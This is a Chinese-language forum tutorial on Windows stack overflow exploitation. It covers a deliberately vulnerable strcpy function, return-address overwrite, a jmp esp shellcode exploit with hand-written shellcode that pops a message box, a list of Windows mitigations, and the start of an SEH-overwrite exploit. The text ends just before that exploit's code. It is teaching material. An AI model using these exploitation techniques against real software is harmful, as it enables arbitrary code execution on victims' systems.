
# [原创]Windows平台下栈溢出漏洞学习笔记

## 一.漏洞原理

### 1.漏洞成因

要理解该漏洞的成因，最重要的是要理解函数执行细节。简单来说，由于程序使用`call`指令调用函数的时候，会改变`eip`的值，以此来修改程序要执行的指令的地址。而为了让程序在执行完函数以后可以正确返回到调用完函数以后要执行的指令地址，在通过`call`指令调用函数的时候，除了会修改`eip`为函数的地址，也会将`call`指令的下一条指令地址（返回地址）保存在栈中。同时，在Debug模式下，函数内部也会保存调用函数前的`ebp`的值，并将`ebp`的值调整到栈顶。接着将栈顶指针`esp`减去一定的大小，开辟出一段栈空间，用来将局部变量保存在栈中，此时`esp`指向的就是开辟的这段栈空间的栈顶，`ebp`指向的是栈空间的栈底，最终形成的栈的局部就会如下图所示：

![](https://bbs.kanxue.com/upload/attach/202201/835440_FC3P72SDKG3DR9K.jpg)

此时就可以通过`ebp`来方便的对局部变量和参数进行操作，`[ebp - X]`就可以获取相应的局部变量，`[ebp + 0x8 + X]`就可以获得相应的参数。而函数返回的时候，函数会通过`mov esp, ebp`指令，将栈顶`esp`指针指向栈底指针`ebp`，接着指向`pop ebp`将保存的原`ebp`的值赋值给`ebp`，此时`esp`将指向保存返回地址的栈地址。最终函数通过调用`retn`指令来退出函数，该指令会将`esp`指向的栈地址中所保存的返回地址赋值给`eip`。也就是说，函数执行完毕之后，继续执行的指令地址此时就会由在栈中保存的返回地址来决定。

由上图可知，保存返回地址和原`ebp`的栈地址是紧跟在局部变量后面的。如果函数没有对用户输入的数据长度进行验证，就将输入的数据保存在局部变量中，就很有可能导致输入的数据覆盖掉返回地址。这样，就导致了返回地址被修改，那么函数退出以后要执行的指令的地址就会变成覆盖以后所指定的地址。

如下的代码执行的功能很简单，仅仅是将`pSzInput`指向的字符串复制到局部变量`szStr`中。但是，此时函数并没有对`pSzInput`所指向的字符串的长度进行验证，且`strcpy`函数也只是以`0x0`作为字符串结束符，将`pSzInput`所指向的字符串复制到局部变量`szStr`中。此时，如果`pSzInput`所指向的字符串长度大于`0x8`，就会导致复制完以后的数据溢出局部变量`szStr`的栈空间，导致覆盖掉返回地址产生漏洞。

```c
void test(char *pSzInput)

{

	char szStr[0x8] = { 0 };



	strcpy(szStr, pSzInput);

}
```

接下来通过调试器来观察数据的保存，首先通过如下代码查看正常情况下，也就是输入数据的长度小于`0x8`的时候，数据是如何保存的。

```c
int main()

{

	char szInput[0x100] = { 0 };

	int iInputLen = 0x8;



	memset(szInput, 'A', iInputLen);

	test(szInput);



	system("pause");



	return 0;

}
```

将程序运行到`strcpy`函数调用前，此时`ecx`保存的就是要赋值的目标字符串的地址，可以看到在赋值前，该数组的元素都是0。紧邻这个数组后面的栈地址，所保存的就是原`ebp`以及返回地址。

![](https://bbs.kanxue.com/upload/attach/202201/835440_K5PFECMXQZVVX7G.jpg)

执行完`strcpy`函数以后，数组中的元素都变成了`0x41`，也就是字符`'A'`对应的asscill码值。

![](https://bbs.kanxue.com/upload/attach/202201/835440_R4VKY6298WF5478.jpg)

紧跟该数组保存的就是原`ebp`和返回地址的值。因为输入数据的长度没有超过数据`szStr`的大小(`0x8`)，因此，原`ebp`和返回地址并没有被覆盖掉，函数可以正常返回到调用函数的指令的下一条指令开始正常运行。

但是，如果此时输入数据的长度超过局部变量数组`szStr`的长度(`0x8`)的话，输入数据就会将原`ebp`以及返回地址覆盖掉。接下来，将输入数据的长度修改为`0x10`，这样就可以刚好覆盖掉原`ebp`和返回地址。

```c
int main()

{

	char szInput[0x100] = { 0 };

	int iInputLen = 0x10;



	memset(szInput, 'A', iInputLen);

	test(szInput);



	system("pause");



	return 0;

}
```

此时，调用完`strcpy`以后，可以看到输入数据将原`ebp`以及返回地址全部覆盖掉了，修改成了字符`'A'`对应的asscill值。

![](https://bbs.kanxue.com/upload/attach/202201/835440_URSXAN926BXFSV9.jpg)

函数继续运行，在运行`retn`指令返回函数前，可以看到`esp`所指向的栈地址中保存的返回地址被修改成了`0x41414141`。

![](https://bbs.kanxue.com/upload/attach/202201/835440_WZTWJF4CVHUPPSG.jpg)

接着执行`retn`指令，程序就会将`eip`修改为`0x41414141`。

![](https://bbs.kanxue.com/upload/attach/202201/835440_U7DAQCM24FNQ6JJ.jpg)

由于`0x41414141`这个地址没有保存合法的指令，因此程序会抛出异常。

![](https://bbs.kanxue.com/upload/attach/202201/GE5JN9RURWYEETD.jpg)

### 2.漏洞利用

由上内容可以知道，可以通过控制输入数据的长度和数值实现对返回地址的修改。这样，当函数执行`retn`指令退出函数的时候，就会将`eip`修改为指定的地址，而在该地址中，如果保存想要运行的指令了，就成功利用了该漏洞实现了对程序的劫持。

由于，此时只能控制栈中保存的数据，所以要执行的指令就只能保存在栈中。因此，想要执行保存在栈中的指令，就需要将`eip`修改为栈中的地址，这样就会运行保存在栈中的指令。

而实现该功能的最佳选择就是`jmp esp`指令，该指令对应的指令编码是`0xFFE4`。因此，可以想办法在程序中找到这条指令的地址，修改程序的返回地址为保存该指令的地址，这样退出函数的时候，程序就会跳转到`jmp esp`指令。通过该指令，`eip`就会修改为`esp`中保存的地址，而在通过`retn`指令退出函数的时候，该指令会将`esp`加4，也就是说此时的`esp`指向的是保存返回地址的栈地址的随后的地址。

而`jmp esp`指令的地址，最好从`ntdll.dll`中获取，因为该dll是最早映射到进程空间的dll，因此它在每个进程中的地址基本是一致的。在我的测试系统上，`ntdll.dll`中保存该指令的地址是`0x7C961EED`。因此，可以通过将返回地址修改为该地址的方式，实现将`eip`修改为栈中空间的地址。

![](https://bbs.kanxue.com/upload/attach/202201/835440_H7HNYP8G4E8KR8J.jpg)

现在已经可以让程序退出函数的时候，成功跳转到保存了返回地址的栈地址偏移`0x4`的地址继续执行。因此，此时只需要将要运行的指令跟在返回地址之后，就可以实现执行想要的代码，这段代码也成为`ShellCode`。

下面就是一段简单的ShellCode，功能是执行一个`MessageBox`函数，然后在调用`ExitProcess`退出程序，因此此时是因为`strcpy`产生的漏洞，所以，编写的`ShellCode`不能含有0，否则的话就会被`strcpy`认为字符串已经结束，导致`ShellCode`运行失败。调用的函数`MessageBox`和`ExitProcess`需要是测试的机器上的地址，这个可以使用调试器获取。

```c
char g_szShellCode[] = { 

			  0x33, 0xDB,			// xor ebx, ebx

			  0x53,				// push ebx，将字符串的结束符0压入栈中         

			  0x68, 0x68, 0x61, 0x63, 0x6B,	// push 0x6B636168，将字符串"hack"压入栈中

			  0x8B, 0xC4,			// mov eax, esp，将字符串的首地址赋给eax

			  0x53,				// push ebx

			  0x50,				// push eax

			  0x50,				// push eax

			  0x53,				// push ebx

			  0xB8, 0x0B, 0x05, 0xD5, 0x77,	// mov eax, user32.MessageBox

			  0xFF, 0xD0,			// call eax

			  0x53,				// push ebx

			  0xB8, 0xA2, 0xCA, 0x81, 0x7C,  // mov eax, user32.ExitProcess

			  0xFF, 0xD0				// call eax

			};
```

最终完成漏洞利用的代码如下：

```c
int main()

{

	char szInput[0x100] = { 0 };

	int iJunkLen = 0x8;

	int iEbpLen = 0x4;

	int iRetLen = 0x4;

	DWORD dwRetAddr = 0x7C961EED;				    // jmp esp地址

	

	LoadLibrary("user32.dll");					  // MessageBox函数在该中，需要将其导入才可以调用

	memset(szInput, 'A', iJunkLen);				   // 覆盖局部变量szStr

	memset(szInput + iJunkLen, 'B', iEbpLen);			      // 覆盖ebp

	*(PDWORD)(szInput + iJunkLen + iEbpLen) = dwRetAddr;		// 覆盖返回地址

	strcpy(szInput + iJunkLen + iEbpLen + iRetLen, g_szShellCode);	// 保存ShellCode

	test(szInput);



	system("pause");



	return 0;

}
```

编译好程序以后，首先查看当`strcpy`运行完时的栈中数据可以看到，此时的原`ebp`和返回地址已经被覆盖掉，返回地址修改为了`ntdll.dll`中的地址。

![](https://bbs.kanxue.com/upload/attach/202201/835440_JTJCMXXQHD2KRF3.jpg)

当执行`retn`指令的时候，此时的栈顶保存的就是`ntdll.dll`中的该地址。

![](https://bbs.kanxue.com/upload/attach/202201/835440_Z3PRURV3NCADP6S.jpg)

因此，继续执行`retn`指令，就会跳转到`ntdll.dll`中的地址执行，而该地址保存的指令就是`jmp esp`。且此时的`esp`进行了`+4`的操作，所以此时的`esp`，就是紧跟在输入数据中返回地址后的`ShellCode`。

![](https://bbs.kanxue.com/upload/attach/202201/835440_9J5UE3GZGKCWJ4K.jpg)

因此，继续执行`jmp esp`指令，就会让程序跳转到在栈中保存的`ShellCode`执行。

![](https://bbs.kanxue.com/upload/attach/202201/835440_W6RRA8UDMWMVGYR.jpg)

继续执行`ShellCode`就会弹窗后退出函数。

![](https://bbs.kanxue.com/upload/attach/202201/YBF78ESN9VUHCN3.jpg)

## 二.Windows安全机制

为了缓解栈溢出漏洞带来的问题，微软提供了如下的内存保护措施：

- 增加了对S.E.H的安全机制，能够有效地挫败绝大多数通过改写S.E.H而劫持进程地攻击

- 使用GS编译技术，在函数返回地址之前加入了Security Cookie，在函数返回前首先检测Security Cookie是否被覆盖，从而把针对操作系统的栈溢出变得非常困难

- DEP（数据执行保护）将数据部分标识为不可执行，阻止了栈中攻击代码的执行

- ASLR（加载地址随机）技术通过对系统关键地址的随机化，使得经典栈溢出手段失效

- SEHOP（S.E.H覆盖保护）作为对安全S.E.H机制的补充，SEHOP将S.E.H的保护提升到系统级别，使得S.E.H的保护机制更为有效

接下来将一一对这些技术进行介绍。

## 三.通过SEH实现漏洞利用

### 1.利用原理

SEH即异常处理结构体，它是Windows异常处理机制所采用的重要数据结构。每个SEH包含两个`DWORD`指针：SEH链表指针和异常处理函数句柄，共八字节，如下图所示：

![](https://bbs.kanxue.com/upload/attach/202201/835440_6VJX5SVAYAV7BA4.jpg)

SEH的结构体是保存在系统栈中的，栈中一般会同时存在多个SEH。这些SEH会通过链表指针由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB偏移为0字节所保存的指针标识，如下图所示。

![](https://bbs.kanxue.com/upload/attach/202201/835440_UBFZTDVUG9T462R.jpg)

当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的SEH，使用异常处理函数句柄所指向的代码来处理异常。当离“事故现场”最近的异常处理函数运行失败时，将顺着SEH链表以此尝试其他的异常处理函数。如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。

由于SEH是存放在栈中的，因此如果数据溢出缓冲区，那么就很有可能会淹没掉SEH。以下就是利用SEH来产生攻击的步骤：

1. 精心制造的溢出数据可以把SEH中异常处理函数的入口地址更改为`shellcode`的起始地址

2. 溢出后错误的栈往往会触发异常

3. 当Windows开始处理溢出后的异常时，会错误地把`shellcode`当作异常处理函数而执行

接下来依然使用上面有栈溢出漏洞的`test`函数作为测试，但是此时需要在栈中注册一个结构化异常处理器。注册的方式也很简单，只要在栈中保存一份SEH结构体即可，且异常处理函数指针指向的函数满足如下的格式：

```c
EXCEPTION_DISPOSITION except_handler(_EXCEPTION_RECORD *ExceptionRecord,

				     void *EstablisherFrame,

				     _CONTEXT *ContextRecord,

				     void *DispatcherContext);
```

因此对于函数的调用，要改成如下的代码：

```c
	// 注册异常处理器

	__asm

	{

		push except_handler		// 处理器结构指针

		push fs:[0]			// 前一个结构化异常处理器的地址

		mov fs:[0], esp		// 登记新的结构

	}



	test(szInput);

	

	// 销毁异常处理器

	__asm

	{

		mov eax, [esp]		// 从栈顶取得前一个异常登记结构的地址

		mov fs:[0], eax		// 将前一个异常结构的地址赋给

		add esp, 8			// 清理栈上的异常登记结构

	}
```

由于要覆盖的是异常处理函数地址，所以要计算`test`函数中的局部变量具体SEH结构的偏移，这样才可以构造足够长度的输入数据来覆盖第一个异常处理函数之前的栈空间，然后才可以覆盖掉异常处理函数的地址。

因此首先要在调试器中中断到`test`函数的`strcpy`函数的调用处。

![](https://bbs.kanxue.com/upload/attach/202201/835440_FPB944N2MAGKKT8.jpg)

可以看到此时局部变量的保存地址是`0x12FE00`，异常处理函数的保存地址是`0x12FE18`。因此，局部变量地址距离SEH结构的地址相差`0x18`，首先就需要对这`0x18`大小的栈空间进行覆盖，随后在的4字节覆盖的就是异常处理函数的地址，可以将其覆盖为`shellcode`的地址，这样程序出现异常的时候就会跳转到`shellcode`的地址继续执行。据此，可以写出如下的漏洞利用代码：

